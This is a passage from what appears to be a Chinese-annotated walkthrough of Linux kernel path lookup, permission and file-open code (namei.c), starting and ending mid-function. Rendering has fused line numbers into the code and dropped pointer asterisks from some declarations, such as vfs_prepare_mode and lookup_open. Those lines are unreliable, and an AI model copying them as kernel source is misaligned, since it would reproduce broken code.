d_flags_negative(smp_load_acquire(&amp;ret-&gt;d_flags))) &#123; //如果找到的是负向项 dput(ret); //减少目录项的引用计数 ret = ERR_PTR(-ENOENT); //返回文件未找到的错误 &#125; return ret; //返回查找结果&#125;EXPORT_SYMBOL(lookup_one_positive_unlocked); //导出符号，供其他模块调用 123456789101112131415161718192021222324252627282930/** * lookup_one_unlocked - 文件系统助手函数，用于查找单个路径名组件 * @idmap: 执行查找的挂载点的idmap * @name: 要查找的路径名组件 * @base: 要从中查找的基础目录 * @len: 应解释为最大长度@len * * 注意，这个函数只是文件系统使用的助手，并不应由通用代码调用。 * * 与lookup_one_len不同，这个函数应在没有占用父目录i_mutex的情况下调用， * 并且如果需要，它会自己获取i_mutex。 */struct dentry *lookup_one_unlocked(struct mnt_idmap *idmap, const char *name, struct dentry *base, int len)&#123; struct qstr this; int err; struct dentry *ret; //定义返回值 err = lookup_one_common(idmap, name, base, len, &amp;this); //调用lookup_one_common函数查找 if (err) return ERR_PTR(err); //如果出错，返回错误指针 ret = lookup_dcache(&amp;this, base, 0); //在目录缓存中查找 if (!ret) ret = lookup_slow(&amp;this, base, 0); //如果在目录缓存中找不到，执行慢查询 return ret; //返回查找结果&#125;EXPORT_SYMBOL(lookup_one_unlocked); //导出符号，供其他模块调用 1234567891011121314151617181920212223242526272829/** * lookup_one_positive_unlocked - 文件系统助手函数，用于查找单个路径名组件 * @idmap: 执行查找的挂载点的idmap * @name: 要查找的路径名组件 * @base: 要从中查找的基础目录 * @len: 应解释为最大长度@len * * 如果找到的是负向项，此助手函数将返回ERR_PTR(-ENOENT)。助手返回已知的正向项或ERR_PTR()。这是大多数用户想要的。 * * 注意，固定的负向项可以在任何时候变成正向项，所以调用lookup_one_unlocked()的函数需要非常小心； * 固定的正向项&gt;d_inode是稳定的，所以这个函数避免了这样的问题。 * * 注意，这个函数只是文件系统使用的助手，并不应由通用代码调用。 * * 在调用这个助手函数时，不应该持有i_mutex。 */struct dentry *lookup_one_positive_unlocked(struct mnt_idmap *idmap, const char *name, struct dentry *base, int len)&#123; struct dentry *ret = lookup_one_unlocked(idmap, name, base, len); //调用lookup_one_unlocked函数查找 if (!IS_ERR(ret) &amp;&amp; d_flags_negative(smp_load_acquire(&amp;ret-&gt;d_flags))) &#123; //如果找到的是负向项 dput(ret); //减少目录项的引用计数 ret = ERR_PTR(-ENOENT); //返回文件未找到的错误 &#125; return ret; //返回查找结果&#125;EXPORT_SYMBOL(lookup_one_positive_unlocked); //导出符号，供其他模块调用 1234567891011121314151617/** * lookup_one_len_unlocked - 文件系统助手函数，用于查找单个路径名组件 * @name: 要查找的路径名组件 * @base: 要从中查找的基础目录 * @len: 应解释为最大长度@len * * 注意，这个函数只是文件系统使用的助手，并不应由通用代码调用。 * * 与lookup_one_len不同，这个函数应在没有占用父目录i_mutex的情况下调用， * 并且如果需要，它会自己获取i_mutex。 */struct dentry *lookup_one_len_unlocked(const char *name, struct dentry *base, int len)&#123; return lookup_one_unlocked(&amp;nop_mnt_idmap, name, base, len); //调用lookup_one_unlocked函数查找&#125;EXPORT_SYMBOL(lookup_one_len_unlocked); //导出符号 12345678910111213/* * 与lookup_one_len_unlocked()类似，只是在否定的情况下返回ERR_PTR(-ENOENT)。 * 返回已知的正数或ERR_PTR()；这是大多数用户想要的。注意，带有解锁父项的固定负数 * 可以在任何时候变为正数，所以lookup_one_len_unlocked()的调用者需要非常小心； * 固定正数的-&gt;d_inode是稳定的，所以这个函数避免了这样的问题。 */struct dentry *lookup_positive_unlocked(const char *name, struct dentry *base, int len)&#123; // 执行查找操作，返回目录项或错误指针。 return lookup_one_positive_unlocked(&amp;nop_mnt_idmap, name, base, len);&#125;EXPORT_SYMBOL(lookup_positive_unlocked); // 导出符号，使其他模块可以使用此函数。 123456789101112131415161718192021222324#ifdef CONFIG_UNIX98_PTYSint path_pts(struct path *path)&#123; // 在与输入路径相同的目录中找到挂载在&quot;pts&quot;上的东西。 struct dentry *parent = dget_parent(path-&gt;dentry); // 获取父目录项。 struct dentry *child; struct qstr this = QSTR_INIT(&quot;pts&quot;, 3); // 初始化名为&quot;pts&quot;的qstr结构体。 if (unlikely(!path_connected(path-&gt;mnt, parent))) &#123; // 如果路径未连接。 dput(parent); // 释放目录项。 return -ENOENT; // 返回错误。 &#125; dput(path-&gt;dentry); // 释放目录项。 path-&gt;dentry = parent; // 将父目录项赋给路径的dentry。 child = d_hash_and_lookup(parent, &amp;this); // 在父目录项中查找并返回子目录项。 if (!child) // 如果找不到子目录项。 return -ENOENT; // 返回错误。 path-&gt;dentry = child; // 将查找到的子目录项赋给路径的dentry。 dput(parent); // 释放父目录项。 follow_down(path, 0); // 跟踪路径。 return 0;&#125;#endif 12345678910111213int user_path_at_empty(int dfd, const char __user *name, unsigned flags, struct path *path, int *empty)&#123; // 获取用户空间的文件名。 struct filename *filename = getname_flags(name, flags, empty); // 查找文件名，并将结果存储在path中。 int ret = filename_lookup(dfd, filename, flags, path, NULL); // 释放filename的内存。 putname(filename); return ret; // 返回结果。&#125;EXPORT_SYMBOL(user_path_at_empty); // 导出符号，使其他模块可以使用此函数。 12345678910111213141516int __check_sticky(struct mnt_idmap *idmap, struct inode *dir, struct inode *inode)&#123; // 获取当前的文件系统用户ID。 kuid_t fsuid = current_fsuid(); // 检查inode的用户ID是否与当前的文件系统用户ID相等。 if (vfsuid_eq_kuid(i_uid_into_vfsuid(idmap, inode), fsuid)) return 0; // 检查dir的用户ID是否与当前的文件系统用户ID相等。 if (vfsuid_eq_kuid(i_uid_into_vfsuid(idmap, dir), fsuid)) return 0; // 检查是否具有对inode进行操作的权限。 return !capable_wrt_inode_uidgid(idmap, inode, CAP_FOWNER);&#125;EXPORT_SYMBOL(__check_sticky); // 导出符号，使其他模块可以使用此函数。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061/* * 检查我们是否可以从目录dir删除链接victim，检查victim的类型是否正确。 * 1. 如果dir是只读的，我们不能做这个（在permission()中已经完成） * 2. 我们应该对dir有写和执行权限 * 3. 我们不能从只追加的dir中删除任何东西 * 4. 我们不能对不可改变的dir做任何事情（在permission()中已经完成） * 5. 如果dir的粘滞位被设置，我们应该 * a. 是dir的所有者，或 * b. 是victim的所有者，或 * c. 有CAP_FOWNER能力 * 6. 如果victim是只追加的或不可变的，我们不能做任何关于指向它的链接的事情 * 7. 如果victim有未知的uid或gid，我们不能更改inode。 * 8. 如果我们被要求删除一个目录，victim不是一个 - ENOTDIR。 * 9. 如果我们被要求删除一个非目录，victim是一个 - EISDIR。 * 10. 我们不能删除根目录或挂载点。 * 11. 我们不允许删除NFS sillyrenamed文件；这是由nfs_async_unlink()处理的。 */static int may_delete(struct mnt_idmap *idmap, struct inode *dir, struct dentry *victim, bool isdir)&#123; struct inode *inode = d_backing_inode(victim); // 获取victim的inode。 int error; if (d_is_negative(victim)) // 如果victim是负的。 return -ENOENT; // 返回错误。 BUG_ON(!inode); // 如果inode不存在，报错。 BUG_ON(victim-&gt;d_parent-&gt;d_inode != dir); // 如果victim的父inode不是dir，报错。 // 当uid或gid无效时，Inode回写不是安全的。 if (!vfsuid_valid(i_uid_into_vfsuid(idmap, inode)) || !vfsgid_valid(i_gid_into_vfsgid(idmap, inode))) return -EOVERFLOW; // 返回错误。 audit_inode_child(dir, victim, AUDIT_TYPE_CHILD_DELETE); // 审计日志。 // 检查对dir的权限。 error = inode_permission(idmap, dir, MAY_WRITE | MAY_EXEC); if (error) // 如果有错误。 return error; // 返回错误。 if (IS_APPEND(dir)) // 如果dir是只追加的。 return -EPERM; // 返回错误。 // 检查是否满足删除的条件。 if (check_sticky(idmap, dir, inode) || IS_APPEND(inode) || IS_IMMUTABLE(inode) || IS_SWAPFILE(inode) || HAS_UNMAPPED_ID(idmap, inode)) return -EPERM; // 返回错误。 if (isdir) &#123; // 如果是目录。 if (!d_is_dir(victim)) // 如果victim不是目录。 return -ENOTDIR; // 返回错误。 if (IS_ROOT(victim)) // 如果victim是根目录。 return -EBUSY; // 返回错误。 &#125; else if (d_is_dir(victim)) // 如果victim是目录。 return -EISDIR; // 返回错误。 if (IS_DEADDIR(dir)) // 如果dir是死目录。 return -ENOENT; // 返回错误。 if (victim-&gt;d_flags &amp; DCACHE_NFSFS_RENAMED) // 如果victim是NFS重命名的文件。 return -EBUSY; // 返回错误。 return 0; // 返回成功。&#125; 12345678910111213141516171819202122/* 检查我们是否可以在目录dir中创建一个带有dentry子项的对象。 * 1. 如果child已经存在，我们不能做这个（open对这种情况有特殊处理， * 但因为我们是内联的，所以没关系） * 2. 如果dir是只读的，我们不能做这个（在permission()中已经完成） * 3. 如果文件系统不能表示fsuid或fsgid，我们不能做这个。 * 4. 我们应该对dir有写和执行权限 * 5. 如果dir是不可改变的我们不能做这个（在permission()中已经完成） */static inline int may_create(struct mnt_idmap *idmap, struct inode *dir, struct dentry *child)&#123; audit_inode_child(dir, child, AUDIT_TYPE_CHILD_CREATE); // 审计日志。 if (child-&gt;d_inode) // 如果child已经存在。 return -EEXIST; // 返回错误。 if (IS_DEADDIR(dir)) // 如果dir是死目录。 return -ENOENT; // 返回错误。 if (!fsuidgid_has_mapping(dir-&gt;i_sb, idmap)) // 如果文件系统不能表示fsuid或fsgid。 return -EOVERFLOW; // 返回错误。 // 检查对dir的权限。 return inode_permission(idmap, dir, MAY_WRITE | MAY_EXEC);&#125; 1234567891011121314151617181920212223242526272829303132333435363738/* * p1和p2应当是同一文件系统上的目录。 */struct dentry *lock_rename(struct dentry *p1, struct dentry *p2)&#123; struct dentry *p; // 如果p1和p2是同一个目录，只需要锁定该目录即可。 if (p1 == p2) &#123; inode_lock_nested(p1-&gt;d_inode, I_MUTEX_PARENT); return NULL; &#125; // 对文件系统的重命名操作进行互斥锁保护，防止并发的重命名操作。 mutex_lock(&amp;p1-&gt;d_sb-&gt;s_vfs_rename_mutex); // 如果p2是p1的祖先目录，先锁定p2，再锁定p1。 p = d_ancestor(p2, p1); if (p) &#123; inode_lock_nested(p2-&gt;d_inode, I_MUTEX_PARENT); inode_lock_nested(p1-&gt;d_inode, I_MUTEX_CHILD); return p; &#125; // 如果p1是p2的祖先目录，先锁定p1，再锁定p2。 p = d_ancestor(p1, p2); if (p) &#123; inode_lock_nested(p1-&gt;d_inode, I_MUTEX_PARENT); inode_lock_nested(p2-&gt;d_inode, I_MUTEX_CHILD); return p; &#125; // 如果p1和p2都不是对方的祖先目录，分别锁定p1和p2。 inode_lock_nested(p1-&gt;d_inode, I_MUTEX_PARENT); inode_lock_nested(p2-&gt;d_inode, I_MUTEX_PARENT2); return NULL;&#125;EXPORT_SYMBOL(lock_rename); 123456789101112// 解锁重命名操作的函数，与lock_rename配对使用。void unlock_rename(struct dentry *p1, struct dentry *p2)&#123; // 解锁p1的inode inode_unlock(p1-&gt;d_inode); // 如果p1和p2不是同一个目录，解锁p2的inode，并解锁重命名操作的互斥锁。 if (p1 != p2) &#123; inode_unlock(p2-&gt;d_inode); mutex_unlock(&amp;p1-&gt;d_sb-&gt;s_vfs_rename_mutex); &#125;&#125;EXPORT_SYMBOL(unlock_rename); 1234567891011121314151617/** * mode_strip_umask - 处理vfs中的umask剥离 * @dir: 新inode的父目录 * @mode: 在@dir中创建的新inode的模式 * * Umask剥离依赖于文件系统是否支持POSIX ACLs。如果文件系统不支持，umask剥离直接在这里进行。 * 如果文件系统支持POSIX ACLs，umask剥离会推迟到文件系统调用posix_acl_create()时进行。 * * 返回: mode */static inline umode_t mode_strip_umask(const struct inode *dir, umode_t mode)&#123; // 如果目录不支持POSIX ACLs，直接将当前的umask与mode进行位与运算，获取剥离umask后的mode。 if (!IS_POSIXACL(dir)) mode &amp;= ~current_umask(); return mode;&#125; 123456789101112131415161718192021222324252627282930313233/*- vfs_prepare_mode - 准备用于新索引节点的模式- @idmap: 索引节点所属的挂载点的idmap- @dir: 新索引节点的父目录- @mode: 新索引节点的模式- @mask_perms: vfs 允许的权限掩码- @type: 要创建的文件类型-- 此辅助函数对将要创建的新对象的 @mode 进行了整合并强制执行 vfs 的限制。-- Umask 的剥离取决于文件系统是否支持 POSIX ACL（参见内核文档中的 mode_strip_umask()）。- 在 setgid 剥离之后进行 umask 剥离允许在非 POSIX ACL 和支持 POSIX ACL 的文件系统上采用相同的顺序。-- 需要注意的是，如果创建的是目录，则 @type 目前可以为0。文件系统单独引发该标志，- 我们需要在强制执行非零类型之前检查每个文件系统是否可以接收来自 vfs 的 S_IFDIR。-- 返回：将传递给文件系统的模式*/ static inline umode_t vfs_prepare_mode(struct mnt_idmap idmap, const struct inode dir, umode_t mode, umode_t mask_perms, umode_t type) &#123; mode = mode_strip_sgid(idmap, dir, mode); // 剥离 SGID 位 mode = mode_strip_umask(dir, mode); // 根据 umask 剥离权限位 /* - 在调用文件系统之前，应用 vfs 规定的允许的权限掩码，并设置要创建的文件类型。 */ mode &amp;= (mask_perms &amp; ~S_IFMT); mode |= (type &amp; S_IFMT); return mode; &#125; 1234567891011121314151617181920212223242526272829303132333435363738394041/**vfs_create - 创建新文件@idmap: 挂载点上找到的索引节点的idmap@dir: @dentry的索引节点@dentry: 基本目录的dentry指针@mode: 新文件的模式@want_excl: 文件是否必须不存在创建一个新文件。如果通过id映射的挂载点找到了索引节点，则必须通过@idmap传递vfsmount的idmap。此函数将在检查权限之前根据@idmap映射索引节点。如果是非id映射的挂载点，或者需要对原始索引节点执行权限检查，只需传递@nop_mnt_idmap。*/int vfs_create(struct mnt_idmap *idmap, struct inode *dir,struct dentry *dentry, umode_t mode, bool want_excl)&#123;int error;// 检查创建文件的权限error = may_create(idmap, dir, dentry);if (error)return error;if (!dir-&gt;i_op-&gt;create)return -EACCES; /* 应该是ENOSYS吗？ */// 准备文件的模式mode = vfs_prepare_mode(idmap, dir, mode, S_IALLUGO, S_IFREG);// 调用安全模块的inode_create函数进行安全检查error = security_inode_create(dir, dentry, mode);if (error)return error;// 调用inode操作的create函数创建新文件error = dir-&gt;i_op-&gt;create(idmap, dir, dentry, mode, want_excl);if (!error)fsnotify_create(dir, dentry);return error;&#125;EXPORT_SYMBOL(vfs_create); 1234567891011121314151617181920212223242526272829303132333435/**vfs_mkobj - 创建新对象@dentry: dentry指针@mode: 新对象的模式@f: 回调函数指针，用于创建新对象@arg: 回调函数的参数创建一个新对象。检查权限并调用回调函数创建新对象。*/int vfs_mkobj(struct dentry *dentry, umode_t mode,int (*f)(struct dentry *, umode_t, void *),void *arg)&#123;struct inode *dir = dentry-&gt;d_parent-&gt;d_inode;int error = may_create(&amp;nop_mnt_idmap, dir, dentry);if (error)return error;mode &amp;= S_IALLUGO;mode |= S_IFREG;// 调用安全模块的inode_create函数进行安全检查error = security_inode_create(dir, dentry, mode);if (error)return error;// 调用回调函数创建新对象error = f(dentry, mode, arg);if (!error)fsnotify_create(dir, dentry);return error;&#125;EXPORT_SYMBOL(vfs_mkobj); 1234567891011/*may_open_dev - 检查是否可以打开设备文件@path: 文件路径检查路径是否允许打开设备文件。返回值为true表示可以打开，否则为false。*/bool may_open_dev(const struct path *path)&#123;return !(path-&gt;mnt-&gt;mnt_flags &amp; MNT_NODEV) &amp;&amp;!(path-&gt;mnt-&gt;mnt_sb-&gt;s_iflags &amp; SB_I_NODEV);&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364static int may_open(struct mnt_idmap \\*idmap, const struct path \\*path,int acc_mode, int flag)&#123;struct dentry \\*dentry = path-&gt;dentry;struct inode \\*inode = dentry-&gt;d_inode;int error;if (!inode) return -ENOENT;// 检查索引节点的类型switch (inode-&gt;i_mode &amp; S_IFMT) &#123;case S_IFLNK: return -ELOOP; // 符号链接文件无法打开case S_IFDIR: if (acc_mode &amp; MAY_WRITE) return -EISDIR; // 目录不可写 if (acc_mode &amp; MAY_EXEC) return -EACCES; // 目录不可执行 break;case S_IFBLK:case S_IFCHR: if (!may_open_dev(path)) return -EACCES; // 无权限打开设备文件 fallthrough;case S_IFIFO:case S_IFSOCK: if (acc_mode &amp; MAY_EXEC) return -EACCES; // 文件不可执行 flag &amp;= ~O_TRUNC; // 清除 O_TRUNC 标志位 break;case S_IFREG: if ((acc_mode &amp; MAY_EXEC) &amp;&amp; path_noexec(path)) return -EACCES; // 文件不可执行 break;&#125;// 检查索引节点的权限error = inode_permission(idmap, inode, MAY_OPEN | acc_mode);if (error) return error;/*- An append-only file must be opened in append mode for writing.- 附加模式只能用于写入附加模式的文件。 */ if (IS_APPEND(inode)) &#123; if ((flag &amp; O_ACCMODE) != O_RDONLY &amp;&amp; !(flag &amp; O_APPEND)) return -EPERM; // 无权限打开附加模式的文件 if (flag &amp; O_TRUNC) return -EPERM; // 无权限截断文件 &#125;/* O_NOATIME can only be set by the owner or superuser */if (flag &amp; O_NOATIME &amp;&amp; !inode_owner_or_capable(idmap, inode)) return -EPERM; // 无权限设置 O_NOATIME 标志位return 0;&#125; 1234567891011121314151617181920212223static int handle_truncate(struct mnt_idmap *idmap, struct file *filp)&#123; // 获取文件路径 const struct path *path = &amp;filp-&gt;f_path; // 获取索引节点 struct inode *inode = path-&gt;dentry-&gt;d_inode; // 获取写入访问权限 int error = get_write_access(inode); if (error) return error; // 调用安全模块的文件截断函数进行安全检查 error = security_file_truncate(filp); if (!error) &#123; // 执行截断操作 error = do_truncate(idmap, path-&gt;dentry, 0, ATTR_MTIME|ATTR_CTIME|ATTR_OPEN, filp); &#125; // 释放写入访问权限 put_write_access(inode); return error;&#125; 1234567static inline int open_to_namei_flags(int flag)&#123; // 将 O_ACCMODE 为 3 的情况转换为 2 if ((flag &amp; O_ACCMODE) == 3) flag--; return flag;&#125; 12345678910111213141516171819202122static int may_o_create(struct mnt_idmap *idmap, const struct path *dir, struct dentry *dentry, umode_t mode)&#123; // 调用安全模块的路径创建节点函数进行安全检查 int error = security_path_mknod(dir, dentry, mode, 0); if (error) return error; // 检查目录所在的超级块是否具有用户和组ID的映射 if (!fsuidgid_has_mapping(dir-&gt;dentry-&gt;d_sb, idmap)) return -EOVERFLOW; // 检查目录索引节点的权限 error = inode_permission(idmap, dir-&gt;dentry-&gt;d_inode, MAY_WRITE | MAY_EXEC); if (error) return error; // 调用安全模块的索引节点创建函数进行安全检查 return security_inode_create(dir-&gt;dentry-&gt;d_inode, dentry, mode);&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556/* * 尝试原子性地查找、创建并打开一个负的dentry（目录项）对应的文件。 * * 如果成功，返回0。文件将被创建并通过文件系统的finish_open()函数附加到@file上。 * * 如果只查找了文件或者不需要创建文件，FMODE_OPENED标志位将不会被设置。 * 调用者需要自行执行打开操作。@path将会更新为指向新的dentry，可能是负值。 * * 否则返回错误代码。 */static struct dentry *atomic_open(struct nameidata *nd, struct dentry *dentry, struct file *file, int open_flag, umode_t mode)&#123; struct dentry *const DENTRY_NOT_SET = (void *) -1UL; struct inode *dir = nd-&gt;path.dentry-&gt;d_inode; int error; // 如果标志位中包含LOOKUP_DIRECTORY，则将open_flag中的O_DIRECTORY标志位置位 if (nd-&gt;flags &amp; LOOKUP_DIRECTORY) open_flag |= O_DIRECTORY; // 设置文件的路径信息为DENTRY_NOT_SET file-&gt;f_path.dentry = DENTRY_NOT_SET; file-&gt;f_path.mnt = nd-&gt;path.mnt; // 调用目录索引节点的原子打开函数进行操作 error = dir-&gt;i_op-&gt;atomic_open(dir, dentry, file, open_to_namei_flags(open_flag), mode); d_lookup_done(dentry); if (!error) &#123; if (file-&gt;f_mode &amp; FMODE_OPENED) &#123; // 如果文件已经打开且dentry与file中的路径不一致，则释放旧的dentry并获取新的dentry if (unlikely(dentry != file-&gt;f_path.dentry)) &#123; dput(dentry); dentry = dget(file-&gt;f_path.dentry); &#125; &#125; else if (WARN_ON(file-&gt;f_path.dentry == DENTRY_NOT_SET)) &#123; error = -EIO; &#125; else &#123; // 如果文件未打开且dentry已经设置，则释放旧的dentry并获取新的dentry if (file-&gt;f_path.dentry) &#123; dput(dentry); dentry = file-&gt;f_path.dentry; &#125; // 如果新的dentry是负值，则表示文件不存在 if (unlikely(d_is_negative(dentry))) error = -ENOENT; &#125; &#125; if (error) &#123; // 如果出现错误，则释放dentry并返回错误指针 dput(dentry); dentry = ERR_PTR(error); &#125; return dentry;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121/*- 查找并可能创建并打开最后一个组件。-- 必须在父目录被锁定的情况下调用（在O_CREAT情况下是互斥的）。-- 成功时返回0，即如果文件成功地原子性地创建（如有必要）并打开，或者- 文件此时尚未完全打开，尽管进行了查找和创建。- 这些情况通过file-&gt;f_mode上存在FMODE_OPENED来区分。- 在后一种情况下，如果没有指定O_CREAT，则@path中的dentry可能为负。-- 失败时返回错误代码。*/ static struct dentry lookup_open(struct nameidata *nd, struct file *file, const struct open_flags *op, bool got_write) &#123; struct mnt_idmap *idmap; struct dentry *dir = nd-&gt;path.dentry; // 获取目录的dentry struct inode *dir_inode = dir-&gt;d_inode; // 获取目录的inode int open_flag = op-&gt;open_flag; // 获取打开标志 struct dentry *dentry; int error, create_error = 0; umode_t mode = op-&gt;mode; // 获取模式 DECLARE_WAIT_QUEUE_HEAD_ONSTACK(wq); // 声明并初始化等待队列头 if (unlikely(IS_DEADDIR(dir_inode))) // 如果目录的inode已经无效 return ERR_PTR(-ENOENT); file-&gt;f_mode &amp;= ~FMODE_CREATED; // 清除FMODE_CREATED标志 dentry = d_lookup(dir, &amp;nd-&gt;last); // 在目录中查找最后一个组件的dentry for (;;) &#123; if (!dentry) &#123; dentry = d_alloc_parallel(dir, &amp;nd-&gt;last, &amp;wq); // 并行分配dentry if (IS_ERR(dentry)) return dentry; &#125; if (d_in_lookup(dentry)) // 如果dentry处于查找状态 break; error = d_revalidate(dentry, nd-&gt;flags); // 重新验证dentry if (likely(error &gt; 0)) // 如果验证成功 break; if (error) // 如果出现错误 goto out_dput; d_invalidate(dentry); // 使dentry无效 dput(dentry); dentry = NULL; &#125; if (dentry-&gt;d_inode) &#123; /* 缓存的正向dentry：将在f_op-&gt;open中打开 */ return dentry; &#125; /* - 检查写权限是棘手的，因为我们不知道是否实际需要它：只要文件存在，O_CREAT打开就可以工作。 - 但是检查存在会破坏原子性。技巧是检查访问权限，如果未授予，则从标志中清除O_CREAT。 - - 另一个问题是返回“正确”的错误值（例如，对于O_EXCL打开，我们希望返回EEXIST而不是EROFS）。 */ if (unlikely(!got_write)) open_flag &amp;= ~O_TRUNC; idmap = mnt_idmap(nd-&gt;path.mnt); if (open_flag &amp; O_CREAT) &#123; if (open_flag &amp; O_EXCL) open_flag &amp;= ~O_TRUNC; mode = vfs_prepare_mode(idmap, dir-&gt;d_inode, mode, mode, mode); // 准备模式 if (likely(got_write)) create_error = may_o_create(idmap, &amp;nd-&gt;path, dentry, mode); // 检查是否可以创建文件 else create_error = -EROFS; &#125; if (create_error) open_flag &amp;= ~O_CREAT; if (dir_inode-&gt;i_op-&gt;atomic_open) &#123; dentry = atomic_open(nd, dentry, file, open_flag, mode); // 原子打开操作 if (unlikely(create_error) &amp;&amp; dentry == ERR_PTR(-ENOENT)) dentry = ERR_PTR(create_error); return dentry; &#125; if (d_in_lookup(dentry)) &#123; struct dentry *res = dir_inode-&gt;i_op-&gt;lookup(dir_inode, dentry, nd-&gt;flags); // 在目录inode上执行lookup操作 d_lookup_done(dentry); if (unlikely(res)) &#123; if (IS_ERR(res)) &#123; error = PTR_ERR(res); goto out_dput; &#125; dput(dentry); dentry = res; &#125; &#125; /* 负向dentry，只需创建文件 */ if (!dentry-&gt;d_inode &amp;&amp; (open_flag &amp; O_CREAT)) &#123; file-&gt;f_mode |= FMODE_CREATED; // 设置FMODE_CREATED标志 audit_inode_child(dir_inode, dentry, AUDIT_TYPE_CHILD_CREATE); // 对子节点进行审计 if (!dir_inode-&gt;i_op-&gt;create) &#123; error = -EACCES; goto out_dput; &#125; error = dir_inode-&gt;i_op-&gt;create(idmap, dir_inode, dentry, mode, open_flag &amp; O_EXCL); // 创建文件 if (error) goto out_dput; &#125; if (unlikely(create_error) &amp;&amp; !dentry-&gt;d_inode) &#123; error = create_error; goto out_dput; &#125; return dentry;out_dput:dput(dentry);return ERR_PTR(error);&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081/* 用于打开最后一个组件的查找过程以及相关操作的函数 */static const char *open_last_lookups(struct nameidata *nd,struct file *file, const struct open_flags *op)&#123;struct dentry *dir = nd-&gt;path.dentry; // 获取目录的dentryint open_flag = op-&gt;open_flag; // 获取打开标志bool got_write = false; // 标记是否获取了写权限struct dentry *dentry; // 用于存储查找到的dentryconst char *res; // 用于返回结果的指针nd-&gt;flags |= op-&gt;intent; // 设置nd的标志位if (nd-&gt;last_type != LAST_NORM) &#123; // 如果最后一个组件不是普通组件（如.或..） if (nd-&gt;depth) put_link(nd); // 清理链接 return handle_dots(nd, nd-&gt;last_type); // 处理.和..&#125;if (!(open_flag &amp; O_CREAT)) &#123; // 如果不是创建文件的操作 if (nd-&gt;last.name[nd-&gt;last.len]) // 如果最后一个组件后面还有字符（可能是斜杠） nd-&gt;flags |= LOOKUP_FOLLOW | LOOKUP_DIRECTORY; // 设置标志位 /* 我们可以在这里处于RCU模式 */ dentry = lookup_fast(nd); // 快速查找dentry if (IS_ERR(dentry)) return ERR_CAST(dentry); // 返回错误指针 if (likely(dentry)) goto finish_lookup; // 跳转到查找完成的部分 BUG_ON(nd-&gt;flags &amp; LOOKUP_RCU); // 如果标志位有LOOKUP_RCU标志，触发BUG&#125; else &#123; /* 创建文件的操作 */ if (nd-&gt;flags &amp; LOOKUP_RCU) &#123; if (!try_to_unlazy(nd)) return ERR_PTR(-ECHILD); // 返回错误指针 &#125; audit_inode(nd-&gt;name, dir, AUDIT_INODE_PARENT); // 对父节点进行审计 /* 是否存在尾部斜杠？ */ if (unlikely(nd-&gt;last.name[nd-&gt;last.len])) return ERR_PTR(-EISDIR); // 返回错误指针&#125;if (open_flag &amp; (O_CREAT | O_TRUNC | O_WRONLY | O_RDWR)) &#123; got_write = !mnt_want_write(nd-&gt;path.mnt); // 获取写权限 /* * 暂时不要失败 - 我们可能不需要它，或者以不同的错误失败； * 让lookup_open()决定；我们将很快丢弃这一个。 */&#125;if (open_flag &amp; O_CREAT) inode_lock(dir-&gt;d_inode); // 锁定目录的inodeelse inode_lock_shared(dir-&gt;d_inode); // 共享锁定目录的inodedentry = lookup_open(nd, file, op, got_write); // 执行查找和创建操作if (!IS_ERR(dentry) &amp;&amp; (file-&gt;f_mode &amp; FMODE_CREATED)) fsnotify_create(dir-&gt;d_inode, dentry); // 发送文件创建事件通知if (open_flag &amp; O_CREAT) inode_unlock(dir-&gt;d_inode); // 解锁目录的inodeelse inode_unlock_shared(dir-&gt;d_inode); // 解锁目录的inodeif (got_write) mnt_drop_write(nd-&gt;path.mnt); // 释放写权限if (IS_ERR(dentry)) return ERR_CAST(dentry); // 返回错误指针if (file-&gt;f_mode &amp; (FMODE_OPENED | FMODE_CREATED)) &#123; dput(nd-&gt;path.dentry); nd-&gt;path.dentry = dentry; // 更新nd的dentry return NULL;&#125;finish_lookup:if (nd-&gt;depth)put_link(nd); // 清理链接res = step_into(nd, WALK_TRAILING, dentry); // 进入下一步查找if (unlikely(res))nd-&gt;flags &amp;= ~(LOOKUP_OPEN|LOOKUP_CREATE|LOOKUP_EXCL);return res; // 返回结果&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960/* * 处理open()的最后一步 */static int do_open(struct nameidata *nd, struct file *file, const struct open_flags *op)&#123; struct mnt_idmap *idmap; // ID映射结构体指针 int open_flag = op-&gt;open_flag; // 打开标志 bool do_truncate; // 是否进行截断操作 int acc_mode; // 访问模式 int error; // 错误码if (!(file-&gt;f_mode &amp; (FMODE_OPENED | FMODE_CREATED))) &#123; error = complete_walk(nd); // 完成路径的遍历 if (error) return error;&#125;if (!(file-&gt;f_mode &amp; FMODE_CREATED)) audit_inode(nd-&gt;name, nd-&gt;path.dentry, 0); // 对目录进行审计idmap = mnt_idmap(nd-&gt;path.mnt); // 获取ID映射结构体指针if (open_flag &amp; O_CREAT) &#123; if ((open_flag &amp; O_EXCL) &amp;&amp; !(file-&gt;f_mode &amp; FMODE_CREATED)) return -EEXIST; // 如果O_EXCL标志被设置，并且文件未被创建，返回文件已存在的错误 if (d_is_dir(nd-&gt;path.dentry)) return -EISDIR; // 如果是目录，返回是目录的错误 error = may_create_in_sticky(idmap, nd, d_backing_inode(nd-&gt;path.dentry)); // 检查是否可以在粘滞位目录中创建文件 if (unlikely(error)) return error;&#125;if ((nd-&gt;flags &amp; LOOKUP_DIRECTORY) &amp;&amp; !d_can_lookup(nd-&gt;path.dentry)) return -ENOTDIR; // 如果标志位有LOOKUP_DIRECTORY标志，并且无法进行查找，返回不是目录的错误do_truncate = false; // 初始化截断标志acc_mode = op-&gt;acc_mode; // 获取访问模式if (file-&gt;f_mode &amp; FMODE_CREATED) &#123; /* 不检查写权限，不进行截断 */ open_flag &amp;= ~O_TRUNC; // 清除O_TRUNC标志 acc_mode = 0; // 设置访问模式为0&#125; else if (d_is_reg(nd-&gt;path.dentry) &amp;&amp; open_flag &amp; O_TRUNC) &#123; error = mnt_want_write(nd-&gt;path.mnt); // 获取写权限 if (error) return error; do_truncate = true; // 设置截断标志为true&#125;error = may_open(idmap, &amp;nd-&gt;path, acc_mode, open_flag); // 检查是否可以打开文件if (!error &amp;&amp; !(file-&gt;f_mode &amp; FMODE_OPENED)) error = vfs_open(&amp;nd-&gt;path, file); // 打开文件if (!error) error = 